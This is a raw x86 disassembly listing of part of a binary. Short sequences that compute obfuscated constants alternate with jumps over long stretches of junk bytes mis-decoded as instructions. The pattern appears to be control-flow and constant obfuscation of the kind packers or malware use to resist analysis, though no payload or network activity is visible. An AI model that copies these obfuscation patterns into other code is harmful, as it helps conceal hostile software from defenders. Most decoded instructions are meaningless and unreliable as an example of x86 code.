  412ffd:	mov    edx,0x8bd6e479
  413002:	inc    ebp
  413003:	hlt    
  413004:	pop    edi
  413005:	pop    esi
  413006:	jmp    0x4130e2
  41300b:	int3   
  41300c:	sub    DWORD PTR [ebx],edi
  41300e:	push   esp
  41300f:	call   DWORD PTR [esi-0x11]
  413012:	mov    ecx,0x3f361785
  413017:	int    0x3a
  413019:	and    BYTE PTR [ebx],dh
  41301b:	adc    bl,dl
  41301d:	add    BYTE PTR [eax],al
  41301f:	mov    edi,0x67000000
  413024:	mov    eax,ds:0xce3bfdff
  413029:	pop    edi
  41302a:	xchg   edx,eax
  41302b:	mov    ebp,0xd840a857
  413030:	push   ss
  413031:	test   DWORD PTR [esi-0x73],esp
  413034:	or     ebx,DWORD PTR [esi]
  413036:	fadd   DWORD PTR [ecx]
  413038:	mov    gs:0x3f1fb011,eax
  41303e:	dec    edi
  41303f:	or     BYTE PTR [ebx-0xcf2512a],bh
  413045:	imul   BYTE PTR [eax+0x66]
  413048:	xchg   esi,eax
  413049:	je     0x41309c
  41304b:	(bad)  
  41304d:	ja     0x413088
  41304f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413050:	stos   BYTE PTR es:[edi],al
  413051:	jno    0x413095
  413053:	mov    bl,0xa
  413055:	lock imul ebx,DWORD PTR [ebp+0x47],0x18c99c97
  41305d:	adc    cl,bl
  41305f:	rcr    BYTE PTR [ebp+0x44a9b59],1
  413065:	aam    0xac
  413067:	stos   DWORD PTR es:[edi],eax
  413068:	and    DWORD PTR [ebp+0xa44dbde],0x4d
  41306f:	xor    ebx,ecx
  413071:	sahf   
  413072:	sub    edx,ebx
  413074:	inc    esp
  413075:	xor    eax,0x48a4d129
  41307a:	rol    al,cl
  41307c:	les    ebx,FWORD PTR [ecx-0x24]
  41307f:	pop    ebx
  413080:	fnsave [ecx-0x48]
  413083:	in     eax,dx
  413084:	stc    
  413085:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413086:	push   cs
  413087:	cwde   
  413088:	daa    
  413089:	add    DWORD PTR [ebx-0x3d9d7e64],eax
  41308f:	mov    ah,0x55
  413091:	pop    edi
  413092:	push   edi
  413093:	xchg   ebp,ecx
  413095:	inc    ebp
  413096:	sbb    al,0x78
  413098:	pop    edi
  413099:	cdq    
  41309a:	aad    0xd7
  41309c:	and    esi,edi
  41309e:	add    DWORD PTR [edx+0x61f03572],edx
  4130a4:	mov    ?,edx
  4130a6:	sub    BYTE PTR [edx],ch
  4130a8:	jae    0x41308b
  4130aa:	mov    eax,cs
  4130ac:	push   ss
  4130ad:	fidivr DWORD PTR [ebx-0x4874419f]
  4130b3:	push   edi
  4130b4:	ficomp DWORD PTR [edi]
  4130b6:	stos   BYTE PTR es:[edi],al
  4130b7:	mov    cl,0x13
  4130b9:	or     dl,BYTE PTR [edx-0x76]
  4130bc:	das    
  4130bd:	ins    BYTE PTR es:[edi],dx
  4130be:	sbb    eax,0x5485930f
  4130c3:	clc    
  4130c4:	sub    ecx,DWORD PTR [ebp+0x5cf1fcf7]
  4130ca:	sub    BYTE PTR [ebx],ah
  4130cc:	(bad)  
  4130ce:	xlat   BYTE PTR ds:[ebx]
  4130cf:	mov    dh,0xb6
  4130d1:	jecxz  0x4130ea
  4130d3:	dec    edi
  4130d4:	pop    ecx
  4130d5:	sub    BYTE PTR [esi],0x85
  4130d8:	push   esi
  4130d9:	cld    
  4130da:	push   ecx
  4130db:	(bad)  
  4130dc:	mov    cl,0xec
  4130de:	lods   al,BYTE PTR ds:[esi]
  4130df:	dec    esp
  4130e0:	aam    0x45
  4130e2:	pop    ebx
  4130e3:	leave  
  4130e4:	ret    0x10
  4130e7:	push   ebp
  4130e8:	mov    ebp,esp
  4130ea:	sub    esp,0xd0
  4130f0:	jmp    0x4131bb
  4130f5:	mov    al,0x34
  4130f7:	and    al,0x8c
  4130f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130fa:	pushf  
  4130fb:	mov    eax,0x8e9d143c
  413100:	imul   edx,edx,0xcfcde029
  413106:	rol    DWORD PTR [eax],cl
  413108:	add    BYTE PTR [esi+0x10000000],ch
  41310e:	outs   dx,DWORD PTR ds:[esi]
  41310f:	hlt    
  413110:	pop    ss
  413111:	sti    
  413112:	or     DWORD PTR cs:[ecx+0x3296760a],ecx
  413119:	lea    si,[edi-0x76]
  41311d:	add    BYTE PTR [ebx+ebp*4+0x3a],ch
  413121:	aaa    
  413122:	ror    DWORD PTR [eax+0x67],0x6b
  413126:	in     al,0x6e
  413128:	mov    ds:0x52945dba,al
  41312d:	or     esi,esi
  41312f:	jmp    0xb9eae31e
  413134:	je     0x41316f
  413136:	sub    eax,ebx
  413138:	dec    edx
  413139:	(bad)  
  41313a:	sub    BYTE PTR [ebx+eax*8],dh
  41313d:	out    dx,eax
  41313e:	int    0x21
  413140:	inc    ecx
  413141:	pop    eax
  413142:	add    ebp,DWORD PTR [ecx-0x34570175]
  413148:	jecxz  0x41312b
  41314a:	lods   al,BYTE PTR ds:[esi]
  41314b:	mov    dl,0xa9
  41314d:	pop    edi
  41314e:	jnp    0x413118
  413150:	cmp    DWORD PTR [esi+0x4e391c],edi
  413156:	add    eax,ebx
  413158:	push   edi
  413159:	popa   
  41315a:	pop    ebx
  41315b:	in     al,0xcd
  41315d:	inc    esi
  41315e:	dec    ecx
  41315f:	cmp    al,0x7e
  413161:	dec    edx
  413162:	mov    ds:0x29f31498,eax
  413167:	adc    al,0xc0
  413169:	push   edx
  41316a:	ficomp DWORD PTR [eax-0x2f]
  41316d:	mov    ebp,DWORD PTR [ecx+0x4a7ffd0a]
  413173:	aaa    
  413174:	outs   dx,DWORD PTR ds:[esi]
  413175:	dec    esp
  413176:	jl     0x413180
  413178:	xchg   ebp,eax
  413179:	jecxz  0x41314f
  41317b:	cdq    
  41317c:	pop    edi
  41317d:	(bad)  
  41317e:	adc    al,al
  413180:	in     eax,dx
  413181:	inc    ebx
  413182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413183:	dec    esp
  413184:	jp     0x413188
  413186:	aaa    
  413187:	ror    bx,1
  41318a:	scas   al,BYTE PTR es:[edi]
  41318b:	lea    esp,[ebx]
  41318d:	dec    eax
  41318e:	inc    ebp
  41318f:	ret    0xad7a
  413192:	push   ds
  413193:	inc    esp
  413194:	(bad)  
  413196:	(bad)
  413199:	adc    DWORD PTR ds:0xe642a0f9,edx
  41319f:	add    edx,DWORD PTR [ecx+0xa]
  4131a2:	arpl   WORD PTR [esi+0x6a],bp
  4131a5:	add    ecx,0xbc97fbc2
  4131ab:	scas   al,BYTE PTR es:[edi]
  4131ac:	jno    0x413190
  4131ae:	fmul   QWORD PTR [edi+0xdcef2cb]
  4131b4:	imul   esp,DWORD PTR [ecx+0x6350d385],0xfffffff1
  4131bb:	push   esi
  4131bc:	mov    DWORD PTR [ebp-0x8],0x1db7
  4131c3:	mov    DWORD PTR [ebp-0xc],0x529
  4131ca:	mov    DWORD PTR [ebp-0x4],0x68d9
  4131d1:	jmp    0x41329c
  4131d6:	shr    dl,1
  4131d8:	xor    DWORD PTR [ebx+edi*1],eax
  4131db:	fcomip st,st(5)
  4131dd:	(bad)  
  4131de:	jae    0x413255
  4131e0:	ret    0xf3cd
  4131e3:	xchg   DWORD PTR [esi],ebp
  4131e5:	cmp    BYTE PTR [ebp-0x2c],bh
  4131e8:	add    BYTE PTR [eax],al
  4131ea:	scas   al,BYTE PTR es:[edi]
  4131eb:	add    BYTE PTR [eax],al
  4131ed:	add    BYTE PTR [esi],dl
  4131ef:	loope  0x4131a9
  4131f1:	stos   BYTE PTR es:[edi],al
  4131f2:	shl    DWORD PTR [eax],1
  4131f4:	ja     0x4131fa
  4131f6:	adc    al,ch
  4131f8:	push   es
  4131f9:	sub    eax,0xe4bc2b67
  4131fe:	int3   
  4131ff:	mov    esp,0xbc74eacf
  413204:	(bad)  
  413205:	xchg   ecx,eax
  413206:	jmp    0x9cfdb13f
  41320b:	add    DWORD PTR [ecx],ebx
  41320d:	bound  eax,QWORD PTR [edx-0x1e9760d]
  413213:	adc    ch,BYTE PTR [edx+0x9dddfc7]
  413219:	mov    eax,ds:0x77892243
  41321e:	pop    ebp
  41321f:	rcr    BYTE PTR [ebp+0x1c],cl
  413222:	mov    bh,0xd5
  413224:	popa   
  413225:	xchg   esi,eax
  413226:	ret    
  413227:	jnp    0x4131e2
  413229:	out    dx,eax
  41322a:	mov    BYTE PTR [ebx-0x59b336db],cl
  413230:	int    0xf1
  413232:	fwait
  413233:	mov    al,0xb2
  413235:	imul   ecx,DWORD PTR [edx-0x64],0xe06361ac
  41323c:	mov    dh,0x15
  41323e:	call   0x76d1:0xb0e59c6c
  413245:	jecxz  0x413290
  413247:	add    bh,BYTE PTR [ecx]
  413249:	pop    es
  41324a:	jg     0x41321e
  41324c:	iret   
  41324d:	inc    eax
  41324e:	test   eax,0xd0a7272f
  413253:	pop    ebx
  413254:	(bad)  
  413255:	pushf  
  413256:	pop    ds
  413257:	xchg   ecx,eax
  413258:	fcomp  QWORD PTR [esi-0x643740c3]
  41325e:	and    eax,0x1a755bbb
  413263:	pusha  
  413264:	mov    edi,DWORD PTR [edi-0x6646743c]
  41326a:	push   ss
  41326b:	jb     0x4132ec
  41326d:	das    
  41326e:	and    dh,BYTE PTR es:[edi-0x5ddbd0cc]
  413275:	add    al,dh
  413277:	shl    BYTE PTR [ecx-0x5e],1
  41327a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41327b:	sub    DWORD PTR [ecx],eax
  41327d:	adc    eax,0xd0033242
  413282:	and    ebx,DWORD PTR [ecx+0x54]
  413285:	pop    es
  413286:	pop    eax
  413287:	stc    
  413288:	dec    edx
  413289:	aad    0x2e
  41328b:	push   ds
  41328c:	test   ah,ch
  41328e:	dec    edi
  41328f:	mov    al,0xc4
  413291:	xchg   edx,eax
  413292:	int3   
  413293:	lea    eax,[edi]
  413295:	inc    edx
  413296:	inc    esi
  413297:	icebp  
  413298:	pop    esi
  413299:	push   edx
  41329a:	aad    0x71
  41329c:	mov    eax,DWORD PTR [ebp-0x4]
  41329f:	jmp    0x41336a
  4132a4:	nop
  4132a5:	xor    cl,bl
  4132a7:	adc    ebx,ebp
  4132a9:	stc    
  4132aa:	fidiv  DWORD PTR [ebx+0x5f5f7077]
  4132b0:	out    0x32,eax
  4132b2:	mov    eax,ds:0xd52b65
  4132b7:	add    BYTE PTR [esi-0x4b000000],ch
  4132bd:	sub    eax,0xcc2fb25a
  4132c2:	mov    bh,0x10
  4132c4:	int3   
  4132c5:	adc    bh,dh
  4132c7:	clc    
  4132c8:	xlat   BYTE PTR ds:[ebx]
  4132c9:	(bad)  
  4132ca:	push   cs
  4132cb:	push   0xf19465f3
  4132d0:	loopne 0x4132bd
  4132d2:	mov    ecx,DWORD PTR ds:0xf6e01704
  4132d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132d9:	and    bl,al
  4132db:	ja     0x41333a
  4132dd:	fld    st(4)
  4132df:	fisttp DWORD PTR [ebp+0x2842dd75]
  4132e5:	xchg   esi,eax
  4132e6:	test   al,0x27
  4132e8:	xor    al,0x3a
  4132ea:	shr    DWORD PTR [eax+0x14dbe8bf],cl
  4132f0:	out    0x15,eax
  4132f2:	xor    eax,DWORD PTR [eax-0x5c0aadb9]
  4132f8:	jo     0x4132e9
  4132fa:	es jne 0x413369
  4132fd:	out    0xb0,eax
  4132ff:	mov    ecx,0x73595e44
  413304:	adc    eax,0xcb283f32
  413309:	dec    esi
  41330a:	jmp    0x41335f
  41330c:	pop    ecx
  41330d:	and    al,0x18
  41330f:	lods   eax,DWORD PTR ds:[esi]
  413310:	add    bl,BYTE PTR [ebp+0x2602cacd]
  413316:	sti    
  413317:	int3   
  413318:	xor    edi,ebx
  41331a:	fxch   st(4)
  41331c:	call   0x793:0xa7fb86f5
  413323:	lds    esp,FWORD PTR [ebx-0x64]
  413326:	jnp    0x4132c9
  413328:	stos   BYTE PTR es:[edi],al
  413329:	mov    al,ds:0x6d5b4a42
  41332e:	mov    eax,0xcd9c763a
  413333:	push   0xffffffb4
  413335:	mov    al,0x77
  413337:	jmp    0x1ebf:0x571adffc
  41333e:	icebp  
  41333f:	enter  0x31a2,0xae
  413343:	retf   
  413344:	shr    BYTE PTR [eax-0x5e],cl
  413347:	inc    ebp
  413348:	rcl    DWORD PTR [ecx],0x6a
  41334b:	xchg   ebp,eax
  41334c:	dec    edi
  41334d:	pop    edx
  41334e:	dec    edx
  41334f:	xchg   ebx,eax
  413350:	test   edx,ebp
  413352:	icebp  
  413353:	out    dx,eax
  413354:	cdq    
  413355:	mov    ds:0x61b35105,al
  41335a:	or     eax,0xc02b805f
  41335f:	adc    al,0x90
  413361:	fcmovb st,st(1)
  413363:	and    al,0x8f
  413365:	ss jo  0x41335b
  413368:	call   0x59d2:0x33056a84
  41336f:	div    ecx
  413371:	mov    ecx,DWORD PTR [ebp-0xc]
  413374:	and    eax,ecx
  413376:	mov    ecx,DWORD PTR [ebp-0x8]
  413379:	imul   eax,ecx
  41337c:	jmp    0x413447
  413381:	into   
  413382:	jbe    0x4133ff
  413384:	mov    al,0xfb
  413386:	mov    ebp,0xd8fa7ecf
  41338b:	lahf   
  41338c:	dec    esi
  41338d:	mov    BYTE PTR [ebx],0x51
  413390:	sbb    al,0xd9
  413392:	aad    0x0
  413394:	add    BYTE PTR [esi+0x2f000000],ch
  41339a:	icebp  
  41339b:	push   ds
  41339c:	pop    edi
  41339d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41339e:	daa    
  41339f:	mov    WORD PTR [esi],fs
  4133a1:	push   ss
  4133a2:	cmp    bl,bl
  4133a4:	sbb    BYTE PTR [esi],dl
  4133a6:	cmp    esp,DWORD PTR [esi+0x10e229b9]
  4133ac:	sbb    BYTE PTR [ecx+0x4d],cl
  4133af:	and    al,BYTE PTR [ecx+0x62]
  4133b2:	push   cs
  4133b3:	in     eax,0xe8
  4133b5:	scas   al,BYTE PTR es:[edi]
  4133b6:	ins    BYTE PTR es:[edi],dx
  4133b7:	jo     0x4133aa
  4133b9:	jne    0x413411
  4133bb:	jo     0x413375
  4133bd:	push   ss
  4133be:	and    ah,BYTE PTR [esi-0x5a7c9964]
  4133c4:	mov    ah,0xd8
  4133c6:	lea    ebp,[edi]
  4133c8:	mov    bl,0x1b
  4133ca:	out    dx,al
  4133cb:	nop
  4133cc:	dec    eax
  4133cd:	add    cl,BYTE PTR [edx]
  4133cf:	aaa    
  4133d0:	imul   BYTE PTR [edx-0x1ff7ecd4]
  4133d6:	mov    ecx,DWORD PTR [edi+0x71]
  4133d9:	xor    edi,DWORD PTR [edi+0x41]
  4133dc:	xchg   DWORD PTR [ebp-0x85849ba],edi
  4133e2:	lods   al,BYTE PTR ds:[esi]
  4133e3:	and    DWORD PTR ds:0x315b8b55,0x72
  4133ea:	dec    esp
  4133eb:	xchg   edx,eax
  4133ec:	add    esp,DWORD PTR [esi+0x7a72aa0d]
  4133f2:	clc    
  4133f3:	fwait
  4133f4:	cmp    ecx,edx
  4133f6:	cwde   
  4133f7:	(bad)  
  4133f8:	fnstenv [edi]
  4133fa:	adc    bl,ah
  4133fc:	shl    DWORD PTR ds:0xa03ad85d,0xba
  413403:	fst    st(0)
  413405:	sbb    ebx,DWORD PTR [edx+0x9]
  413408:	(bad)  
  413409:	push   edx
  41340a:	pop    esi
  41340b:	aaa    
  41340c:	sub    dh,BYTE PTR [edx-0x56dde784]
  413412:	jp     0x41340f
  413414:	mov    ds:0x7b32aabf,eax
  413419:	call   0x2c68:0xbe13e1e4
  413420:	add    eax,0xc1df8426
  413425:	js     0x413446
  413427:	xor    cl,cl
  413429:	and    DWORD PTR [ebx],edx
  41342b:	std    
  41342c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41342d:	fisubr DWORD PTR [ebp+0x15]
  413430:	lea    ebp,[ebx]
  413432:	dec    ecx
  413433:	jmp    DWORD PTR [ebx+esi*1]
  413436:	lahf   
  413437:	mov    esp,0x9ccfc383
  41343c:	mov    ds:0xc30c32a4,al
  413441:	sbb    DWORD PTR [esi-0x690f0a25],esi
  413447:	xor    eax,0x7b8098
  41344c:	add    eax,DWORD PTR ds:0x4331b4
  413452:	mov    DWORD PTR [ebp-0x68],eax
  413455:	mov    DWORD PTR [ebp-0x4],0x458d
  41345c:	mov    DWORD PTR [ebp-0xc],0x7019
  413463:	mov    DWORD PTR [ebp-0x8],0x3dae
  41346a:	mov    eax,DWORD PTR [ebp-0x8]
  41346d:	mov    ecx,DWORD PTR [ebp-0xc]
  413470:	add    eax,0x4e7b
  413475:	or     eax,ecx
  413477:	mov    ecx,DWORD PTR [ebp-0x4]
  41347a:	lea    eax,[ebp+eax*1-0x60]
  41347e:	lea    eax,[eax+ecx*1-0x141c6]
  413485:	jmp    0x413550
  41348a:	pusha  
  41348b:	fwait
  41348c:	mov    eax,0x74effbec
  413491:	lahf   
  413492:	das    
  413493:	fstp   QWORD PTR [ecx-0x22]
  413496:	inc    esp
  413497:	mov    ebp,0xd687de22
  41349c:	add    BYTE PTR [eax],al
  41349e:	scas   al,BYTE PTR es:[edi]
  41349f:	add    BYTE PTR [eax],al
  4134a1:	add    dh,ah
  4134a3:	jmp    0xea582a2
  4134a8:	xor    DWORD PTR [ebx],ebp
  4134aa:	inc    BYTE PTR [edi-0x80]
  4134ad:	popa   
  4134ae:	or     al,0x8f
  4134b0:	loope  0x413526
  4134b2:	imul   eax,edx,0x1817c0bf
  4134b8:	test   eax,0x9e44a660
  4134bd:	push   cs
  4134be:	push   edi
  4134bf:	outs   dx,BYTE PTR ds:[esi]
  4134c0:	sub    esp,DWORD PTR [esi+0x3d2c3dc3]
  4134c6:	lahf   
  4134c7:	loop   0x413505
  4134c9:	(bad)  
  4134ca:	mov    bh,0xeb
  4134cc:	mov    BYTE PTR [ecx+0x3ee09078],cl
  4134d2:	aad    0x8f
  4134d4:	and    BYTE PTR [ebp-0x1d],cl
  4134d7:	or     esi,0x9a9a73f7
  4134dd:	clc    
  4134de:	sbb    eax,0x42c3b719
  4134e3:	mov    bh,BYTE PTR [ebx+edx*2]
  4134e6:	push   ecx
  4134e7:	out    dx,eax
  4134e8:	clc    
  4134e9:	adc    DWORD PTR [esi],edx
  4134eb:	cmp    eax,eax
  4134ed:	cmp    dh,BYTE PTR gs:[eax]
  4134f0:	test   eax,0xaf3812d7
  4134f5:	mov    ah,0x22
  4134f7:	and    BYTE PTR [ebx+0x5283ba17],ch
  4134fd:	leave  
  4134fe:	sbb    esi,eax
  413500:	js     0x413491
  413502:	popa   
  413503:	xchg   esi,eax
  413504:	lods   al,BYTE PTR ds:[esi]
  413505:	fisub  WORD PTR [edx]
  413507:	inc    edi
  413508:	retf   
  413509:	sub    DWORD PTR [eax],edi
  41350b:	dec    eax
  41350c:	add    ah,BYTE PTR [ebp-0x39]
  41350f:	xchg   edx,ebp
  413511:	ins    DWORD PTR es:[edi],dx
  413512:	(bad)  
  413513:	sbb    al,BYTE PTR [eax]
  413515:	fadd   QWORD PTR [ecx]
  413517:	xor    bh,al
  413519:	inc    ebx
  41351a:	fdivr  QWORD PTR [eax+0x59]
  41351d:	(bad)  
  41351e:	or     al,0x24
  413520:	dec    edi
  413521:	test   edx,ecx
  413523:	in     eax,0x41
  413525:	dec    esp
  413526:	fmul   DWORD PTR [eax]
  413528:	shl    DWORD PTR [ecx+0x2c],cl
  41352b:	mov    al,ds:0x6ec3d941
  413530:	inc    edi
  413531:	xor    BYTE PTR [esi],al
  413533:	loopne 0x413505
  413535:	and    al,0x79
  413537:	adc    DWORD PTR es:[edi],ecx
  41353a:	add    esi,eax
  41353c:	repnz into 
  41353e:	test   BYTE PTR [ebx-0x6c],al
  413541:	or     BYTE PTR [edx],0x12
  413544:	in     eax,0xf7
  413546:	loop   0x413549
  413548:	add    dl,BYTE PTR [ecx+0x426eda]
  41354e:	jb     0x4134e0
  413550:	mov    ecx,DWORD PTR ds:0x4332d4
  413556:	mov    DWORD PTR [eax],ecx
  413558:	jmp    0x413623
  41355d:	leave  
  41355e:	adc    DWORD PTR [ebx],ebx
  413560:	neg    ebx
  413562:	(bad)  
  413563:	in     eax,dx
  413564:	aas    
  413565:	adc    BYTE PTR [eax-0x6ff9212c],bl
  41356b:	dec    esi
  41356c:	imul   esi,DWORD PTR ds:0xae0000d7,0x22000000
  413576:	std    
  413577:	adc    al,0x86
  413579:	inc    ebx
  41357a:	test   BYTE PTR [edx],0x93
  41357d:	outs   dx,DWORD PTR ds:[esi]
  41357f:	clc    
  413580:	je     0x413512
  413582:	xor    dl,BYTE PTR [eax+0x36]
  413585:	dec    ebx
  413586:	add    DWORD PTR [edi],0xac36f6da
  41358c:	mov    ebx,DWORD PTR ds:0x5f4df1ca
  413592:	out    0x96,eax
  413594:	sub    bh,BYTE PTR [edi]
  413596:	mov    esp,0xf6e70f7d
  41359b:	ficomp WORD PTR [ebp+0x0]
  41359e:	jae    0x413529
  4135a0:	xor    al,BYTE PTR [ebp-0x1cbfc408]
  4135a6:	daa    
  4135a7:	and    eax,0x854dd464
  4135ac:	push   0x13
  4135ae:	sahf   
  4135af:	mov    ebp,DWORD PTR [esi-0x559b606d]
  4135b5:	push   ecx
  4135b6:	js     0x41359d
  4135b8:	gs aas 
  4135ba:	cli    
  4135bb:	pop    eax
  4135bc:	mov    ds:0x67442e36,eax
  4135c1:	leave  
  4135c2:	pop    ebx
  4135c3:	pushf  
  4135c4:	into   
  4135c5:	sub    esi,DWORD PTR [edx+0x49]
  4135c8:	mov    cl,0xf0
  4135ca:	add    edi,ebx
  4135cc:	mov    dl,0x6c
  4135ce:	sti    
  4135cf:	inc    eax
  4135d0:	pop    ss
  4135d1:	aam    0xae
  4135d3:	in     eax,0x41
  4135d5:	bnd jb 0x413649
  4135d8:	out    dx,eax
  4135d9:	fcomp  DWORD PTR [ebp-0x52]
  4135dc:	adc    eax,0x4bd51e7f
  4135e1:	or     bl,al
  4135e3:	std    
  4135e4:	jp     0x4135cd
  4135e6:	jge    0x4135a8
  4135e8:	pop    ecx
  4135e9:	mov    ch,bh
  4135eb:	aaa    
  4135ec:	test   BYTE PTR [eax],ah
  4135ee:	xchg   ecx,eax
  4135ef:	pop    ds
  4135f0:	in     eax,0xf1
  4135f2:	cwde   
  4135f3:	sbb    ch,BYTE PTR [ebp+0x30]
  4135f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135f7:	push   ebx
  4135f8:	push   esp
  4135f9:	jp     0x4135ac
  4135fb:	push   edi
  4135fc:	fdivr  DWORD PTR [eax+0x2e749bd5]
  413602:	dec    eax
  413603:	mov    eax,ds:0x3c4b0213
  413608:	in     al,dx
  413609:	mov    ds:0xd7464db9,al
  41360e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41360f:	icebp  
  413610:	cmc    
  413611:	leave  
  413612:	retf   
  413613:	into   
  413614:	push   ebp
  413615:	fcomip st,st(3)
  413617:	fadd   st,st(2)
  413619:	int    0xf
  41361b:	adc    ebp,DWORD PTR [esi-0x6c]
  41361e:	add    DWORD PTR [esi],0x71
  413621:	pop    esp
  413622:	mov    al,bh
  413624:	inc    ebp
  413625:	hlt    
  413626:	std    
  413627:	push   ds
  413628:	add    BYTE PTR [eax],al
  41362a:	mov    DWORD PTR [ebp-0x8],0x3cd6
  413631:	mov    eax,DWORD PTR [ebp-0x8]
  413634:	mov    ecx,DWORD PTR [ebp-0xc]
  413637:	add    eax,0x1ffb
  41363c:	or     eax,ecx
  41363e:	and    eax,0x2b8d
  413643:	mov    ecx,0x3a8d
  413648:	sub    ecx,eax
  41364a:	mov    DWORD PTR [ebp-0x64],ecx
  41364d:	mov    DWORD PTR [ebp-0x4],0x2def
  413654:	mov    DWORD PTR [ebp-0xc],0x2cdc
  41365b:	mov    DWORD PTR [ebp-0x8],0x10ae
  413662:	mov    eax,DWORD PTR [ebp-0x8]
  413665:	mov    ecx,DWORD PTR [ebp-0xc]
  413668:	or     eax,ecx
  41366a:	mov    ecx,DWORD PTR [ebp-0x4]
  41366d:	jmp    0x413738
  413672:	(bad)  
  413673:	es mov bl,0x50
  413676:	repz aad 0xf7
  413679:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41367a:	nop
  41367b:	cmp    ch,BYTE PTR [ebx-0x37527641]
  413681:	dec    esi
  413682:	jecxz  0x41365b
  413684:	add    BYTE PTR [eax],al
  413686:	scas   al,BYTE PTR es:[edi]
  413687:	add    BYTE PTR [eax],al
  413689:	add    BYTE PTR [edi],dh
  41368b:	test   DWORD PTR ds:0x2043a15e,ecx
  413691:	jae    0x413642
  413693:	push   esp
  413694:	popf   
  413695:	ret    
  413696:	(bad)  
  413697:	push   ebx
  413698:	je     0x41368c
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	push   0xb3af6ae6
  4136a0:	dec    ebp
  4136a1:	ja     0x4136a8
  4136a3:	popf   
  4136a4:	sbb    cl,BYTE PTR [ebx+0x6ea57d1]
  4136aa:	aam    0x95
  4136ac:	test   DWORD PTR [edx],ebp
  4136ae:	in     al,dx
  4136af:	push   0xd11c050d
  4136b4:	push   es
  4136b5:	pop    es
  4136b6:	adc    ecx,DWORD PTR [edi]
  4136b8:	addr16 cdq 
  4136ba:	mov    al,ds:0x452cb7fc
  4136bf:	jp     0x413641
  4136c1:	arpl   WORD PTR [esi-0x41],di
  4136c4:	dec    eax
  4136c5:	add    al,bh
  4136c7:	icebp  
  4136c8:	pop    eax
  4136c9:	popf   
  4136ca:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4136cc:	and    DWORD PTR [ebp+0x68e574d2],ebx
  4136d2:	idiv   DWORD PTR [eax+0x6]
  4136d5:	or     eax,0x99df43f9
  4136da:	pop    ebx
  4136db:	js     0x41367d
  4136dd:	mov    BYTE PTR [ecx],0x6d
  4136e0:	scas   eax,DWORD PTR es:[edi]
  4136e1:	stos   DWORD PTR es:[edi],eax
  4136e2:	retf   
  4136e3:	push   cs
  4136e4:	gs es lahf 
  4136e7:	add    edx,eax
  4136e9:	daa    
  4136ea:	repz and dh,BYTE PTR [eax]
  4136ed:	call   0x79dd:0xcd202c85
  4136f4:	imul   ebp
  4136f6:	xor    al,BYTE PTR [ecx+0x64fcffc2]
  4136fc:	inc    esp
  4136fd:	out    dx,al
  4136fe:	lds    ebp,FWORD PTR [ecx+0x29f7395c]
  413704:	aam    0x69
  413706:	popa   
  413707:	sub    bl,BYTE PTR [ecx+eax*1-0x73]
  41370b:	je     0x4136b7
  41370d:	into   
  41370e:	aas    
  41370f:	inc    eax
  413710:	mov    bl,0x1d
  413712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413713:	inc    esi
  413714:	(bad)  
  413715:	neg    BYTE PTR [ebp+0x84e012c]
  41371b:	jle    0x41372e
  41371d:	lods   eax,DWORD PTR ds:[esi]
  41371e:	repnz cmp eax,0x3f412ba9
  413724:	push   es
  413725:	fs ret 
  413727:	stc    
  413728:	retf   
  413729:	cwde   
  41372a:	jb     0x41379f
  41372c:	jmp    0x583c:0xeb092826
  413733:	mov    edx,0xc8dea508
  413738:	imul   eax,eax,0x6438
  41373e:	jmp    0x413809
  413743:	clc    
  413744:	cs clc 
  413746:	and    edi,esi
  413748:	idiv   ebx
  41374a:	jmp    DWORD PTR [esi+0x668f1bd4]
  413750:	jae    0x4137ac
  413752:	mov    ebx,0xd891
  413757:	scas   al,BYTE PTR es:[edi]
  413758:	add    BYTE PTR [eax],al
  41375a:	add    BYTE PTR [ebp-0x5fc257ac],bh
  413760:	jge    0x41379a
  413762:	in     al,dx
  413763:	ret    
  413764:	mov    ah,0x2c
  413766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413767:	in     al,dx
  413768:	dec    ebp
  413769:	loopne 0x41371f
  41376b:	arpl   bp,bx
  41376d:	pusha  
  41376e:	adc    bl,bl
  413770:	je     0x4136f3
  413772:	lods   al,BYTE PTR ds:[esi]
  413773:	imul   edi,DWORD PTR [edx-0x2a22f0b0],0x516b2578
  41377d:	mov    esp,0xf50296d1
  413782:	pop    eax
  413783:	cmc    
  413784:	cmp    BYTE PTR [ebp-0x2],al
  413787:	xor    DWORD PTR ds:0x62c466c9,0xb50a5bac
  413791:	lds    edx,FWORD PTR [ecx+0x7d466f0c]
  413797:	adc    al,0xad
  413799:	inc    edx
  41379a:	jns    0x4137b0
  41379c:	jne    0x413812
  41379e:	jmp    0x44c7:0x6954d1c
  4137a5:	popf   
  4137a6:	or     edx,eax
  4137a8:	sub    al,0xea
  4137aa:	jae    0x4137bf
  4137ac:	add    esp,esi
  4137ae:	pop    ecx
  4137af:	stos   DWORD PTR es:[edi],eax
  4137b0:	lods   al,BYTE PTR ds:[si]
  4137b2:	jne    0x4137c6
  4137b4:	test   DWORD PTR [esi+eax*4+0x71f5ac9c],0x7f60c1ea
  4137bf:	pop    edx
  4137c0:	(bad)  
  4137c1:	pop    ds
  4137c2:	shl    ch,1
  4137c4:	in     al,0x2f
  4137c6:	push   eax
  4137c7:	jle    0x4137bd
  4137c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137ca:	(bad)  
  4137cb:	lods   eax,DWORD PTR ds:[esi]
  4137cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137cd:	shl    BYTE PTR [edx],0x4
  4137d0:	and    dh,BYTE PTR [edi+0x4575fb47]
  4137d6:	repnz dec edi
  4137d8:	ins    BYTE PTR es:[edi],dx
  4137d9:	fnstcw WORD PTR [edx]
  4137db:	popf   
  4137dc:	lahf   
  4137dd:	mov    dh,0xe6
